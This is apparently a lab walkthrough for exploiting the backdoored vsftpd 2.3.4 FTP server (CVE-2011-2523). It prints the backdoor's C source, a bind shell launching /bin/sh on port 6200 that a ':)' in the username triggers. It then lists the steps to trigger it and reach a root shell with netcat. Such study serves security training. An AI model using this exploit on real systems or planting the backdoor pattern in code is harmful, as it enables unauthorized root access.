# Attacking Port 21
### Service Scan 
```
[root@admin sploit]# nmap -sV -p21 $ip
Nmap scan report for 192.168.56.101

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix
```
### Analysis
- vsftpd 2.3.4, Let's check if there are any known vulnerabilities
- On [cve.org](https://www.cve.org/CVERecord?id=CVE-2011-2523) we found CVE-2011-2523, malicious backdoor entry in the source code, which opens a shell on port 6200/tcp , which was distributed from june 30 to july 3 2011
```c
// sysdeputil.c
// The function here opens a /bin/sh shell on port 6200
int vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1);
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa,
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == -1) exit(1);
  for(;;)
  {
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0);
  }
}

/*
 str.c
 The function is used to check if space character is present in the string
 A malicious backdoor is inserted here which sets up the /bin/sh shell using the
 vsf_sysutil_extra() function, to start it there must be a ":)" substring present
 in the original string
*/
str_contains_space(const struct mystr* p_str)
{
  unsigned int i;
  for (i=0; i < p_str->len; i++)
  {
    if (vsf_sysutil_isspace(p_str->p_buf[i]))
    {
      return 1;
    }
    else if((p_str->p_buf[i]==0x3a)
    && (p_str->p_buf[i+1]==0x29))
    {
      vsf_sysutil_extra();
    }
  }
  return 0;
}

// privops.c
// This is the login function that uses the str_contains_space function
static enum EVSFPrivopLoginResult
handle_login(struct vsf_session* p_sess, struct mystr* p_user_str,
             const struct mystr* p_pass_str)
{
	...
	...
	if (!vsf_sysutil_isalnum(first_char) &&
	    first_char != '_' &&
	    first_char != '.')
	{
	    return kVSFLoginFail;
	}
	/* Throw out non-printable characters and space in username */
	if (str_contains_space(p_user_str) ||
	    str_contains_unprintable(p_user_str))
	{
		return kVSFLoginFail;
	}
	...
	...
}
// However to reach the backdoor we need the first character of username to be alpha numeric eg could be "a:)", "aa:)", "z:)op", etc
```
### Exploit 
![vsFTPd 2.3.4](vsFTPd%202.3.4.png)
- FTP takes `USER` and `PASS` before checking them.
- We use `USER a:)` that opens the backdoor, password can be anything.
- On the server, the backdoor opens on port 6200/tcp.
- We connect to it using netcat, and we get a shell connection as root user.